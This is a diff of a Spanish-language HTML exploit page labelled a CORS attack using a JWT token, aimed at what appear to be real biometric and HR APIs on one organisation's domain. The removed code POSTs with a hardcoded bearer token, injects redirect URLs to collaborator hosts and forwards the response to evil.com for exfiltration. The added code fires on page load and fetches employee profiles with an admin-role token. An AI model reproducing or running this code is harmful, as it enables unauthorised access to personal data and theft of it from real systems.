@@ -5,35 +5,45 @@
 </head>
 <body>
     <h2>Explotación CORS con Token JWT</h2>
-    <button onclick="explotarCORS()">Ejecutar Exploit</button>
+    <button onclick="obtenerPerfilEmpleado()">Ejecutar Exploit</button>
 
     <script>
-        function explotarCORS() {
-            fetch("https://biometriasd.securitydata.net.ec/microservices-biometria/api/auth/autenticarSolicitud", {
-                method: "POST",
-                headers: {
-                    "User-Agent": "Rocket",
-                    "Content-Type": "application/json",
-                    "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwcnVlYmEiLCJpYXQiOjE3Mzg3MDU3OTQsImV4cCI6MTczODc0MTc5NH0.b9dz6MfAiz4XtoInV8n3_S39ZU1pcJ4Vql5PkzllRcI"
-                },
-                body: JSON.stringify({
-                    "documento": "0957436058",
-                    "urlNotificacion": "http://localhost:8080/api/secret?redirect=http://uvtxxcceyncfffltkr78en086zcq0ood.oastify.com/exfiltrar",
-                    "urlSalida": "https://v2yy4djf5ojgmgsurse9lo79d0jr7hv6.oastify.com",
-                    "urlImagen": "http://localhost/hola?redirect=http://uvtxxcceyncfffltkr78en086zcq0ood.oastify.com/exfiltrar",
-                    "imagenBase64": "XXXXXXXXXXXXXXXXXXXXX",
-                    "isBase64": false,
-                    "metaData": {"idTramite": 1234},
-                    "tipoBiometria": "TIPO_SERVICIO_BIOMETRIA"
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log("Respuesta de la API:", data);
-                fetch("https://evil.com/robar?data=" + btoa(JSON.stringify(data)));  // Exfiltra datos a un servidor malicioso
-            })
-            .catch(err => console.error("Error:", err));
+    async function obtenerPerfilEmpleado() {
+        const url = "https://quanta.securitydata.net.ec/api/v1/hrms/employees/profile";
+
+        const headers = {
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9,es;q=0.8,zh-TW;q=0.7,zh;q=0.6",
+            "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlcyI6WyJVU0VSIiwiQURNSU4iXSwic3ViIjoiMDk1NzQzNjA1OCIsImlhdCI6MTc0MTI5Mzc2MSwiZXhwIjoxNzQyNTAzMzYxfQ.JAj09CR-BYk86OHJBkzRzUlf4uc8JNFgpUOs3wN5QEQ",
+            "Connection": "keep-alive",
+            "Content-Type": "application/json",
+            "Referer": "https://quanta.securitydata.net.ec/sistema-hrms/index.html",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-origin",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+            "sec-ch-ua": `"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"`,
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": `"Windows"`
+        };
+
+        try {
+            const response = await fetch(url, { method: "GET", headers });
+
+            if (!response.ok) {
+                throw new Error(`Error HTTP: ${response.status}`);
+            }
+
+            const data = await response.json();
+            console.log("Datos del perfil del empleado:", data);
+        } catch (error) {
+            console.error("Error al obtener el perfil del empleado:", error);
         }
-    </script>
+    }
+
+    // Llamar a la función para obtener los datos
+    obtenerPerfilEmpleado();
+</script>
+
 </body>
 </html>
